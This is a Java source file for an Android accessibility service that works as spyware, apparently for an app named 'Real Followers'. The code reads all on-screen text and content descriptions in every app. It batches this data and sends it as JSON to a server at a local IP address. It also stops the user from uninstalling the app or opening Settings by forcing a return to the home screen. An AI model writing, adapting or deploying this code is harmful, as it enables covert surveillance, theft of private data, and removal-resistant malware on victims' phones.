package com.example.demo;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final int BATCH_SIZE = 20;

    private final Set<String> loggedNodes = new HashSet<>();
    private final Set<String> tmpNodes = new HashSet<>();
    private final Set<String> loggedPackages = new HashSet<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();

        try {
            if (event.getPackageName() != null) {
                handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage() + " [" + System.currentTimeMillis() + "]", e);
        }

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationStateChanged(event);
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (event.getPackageName() != null) {
                    handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
                }
            }, 100);
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
            String contentDescription = event.getContentDescription() != null ? event.getContentDescription().toString() : "";
            String text = event.getText().toString();
            if (contentDescription.contains("Real Followers")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            }
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName().toString();
            String text = event.getText().toString();
            // Not working for few android versions ... idk why ( i made some changes in this if statement... idk if it will work now )
            if (isPackageInstaller(packageName)) {
                if (text.contains("Real Followers") && text.contains("Do you want to uninstall this app?")) {
                        performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }
            // Remove this else-if part if you want the settings to open
            else if (isSettingsApp(packageName)) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            }
        }
    }

    public void handleNodeInfo(AccessibilityNodeInfo node, int depth, String packageName) {
        if (node == null) {
            return;
        }

        if (!loggedPackages.contains(packageName)) {
            loggedPackages.add(packageName);
        }

        StringBuilder indentation = new StringBuilder();
        for (int j = 0; j < depth; j++) {
            indentation.append("  ");
        }

        CharSequence nodeText = node.getText();
        CharSequence nodeContentDescription = node.getContentDescription();
        String className = getClassSimpleName(node.getClassName() != null ? node.getClassName().toString() : "UnknownClass");

        String nodeDescription = packageName + " " + className + " " +
                (nodeText != null ? nodeText : "") + " " +
                (nodeContentDescription != null && !nodeContentDescription.equals(nodeText) ? nodeContentDescription : "");

        if ((!isEmpty(nodeText) || !isEmpty(nodeContentDescription)) && loggedNodes.add(nodeDescription)) {
            String sb = indentation + className + " " +
                    (nodeText != null ? nodeText : "") + " " +
                    (nodeContentDescription != null ? nodeContentDescription : "") +
                    " " + System.currentTimeMillis();

            tmpNodes.add(sb);

            if (tmpNodes.size() >= BATCH_SIZE) {
                sendDatatoServer(new HashSet<>(tmpNodes));
                tmpNodes.clear();
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            handleNodeInfo(node.getChild(i), depth + 1, packageName);
        }
    }

    private void sendDatatoServer(Set<String> dataSet) {
        List<String> dataList = new ArrayList<>(dataSet);
        new DataSenderTask().execute(dataList);
    }

    private String getClassSimpleName(String className) {
        String[] parts = className.split("\\.");
        return parts.length > 0 ? parts[parts.length - 1] : className;
    }

    private boolean isEmpty(CharSequence str) {
        return str == null || str.length() == 0;
    }

    private static class DataSenderTask extends AsyncTask<List<String>, Void, Void> {
        @Override
        protected Void doInBackground(List<String>... params) {
            HttpURLConnection urlConnection = null;
            try {
                URL url = new URL("http://192.168.1.7:5000");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);
                urlConnection.setRequestProperty("Content-Type", "application/json");

                List<String> dataList = params[0];
                Collections.sort(dataList, new Comparator<String>() {
                    @Override
                    public int compare(String s1, String s2) {
                        long timestamp1 = Long.parseLong(s1.substring(s1.lastIndexOf(" ") + 1));
                        long timestamp2 = Long.parseLong(s2.substring(s2.lastIndexOf(" ") + 1));
                        return Long.compare(timestamp1, timestamp2);
                    }
                });

                JSONArray jsonArray = new JSONArray(dataList);

                try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
                    writer.write(jsonArray.toString());
                    writer.flush();
                }

                int responseCode = urlConnection.getResponseCode();

            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage(), e);
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
            return null;
        }
    }

    private void handleNotificationStateChanged(AccessibilityEvent event) {
        Parcelable parcelable = event.getParcelableData();
        if (parcelable instanceof Notification) {
            Notification notification = (Notification) parcelable;
        } else {
            List<CharSequence> notificationText = event.getText();
            if (!notificationText.isEmpty()) {
                for (CharSequence t : notificationText) {
                }
            }
        }
    }

    private boolean isPackageInstaller(String packageName) {
        return packageName.contains("com.google.android.packageinstaller") || packageName.contains("com.android.packageinstaller");
    }

    private boolean isSettingsApp(String packageName) {
        return packageName.contains("com.android.settings");
    }

    private boolean shouldPreventUninstall() {
        return true;
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
    }
}
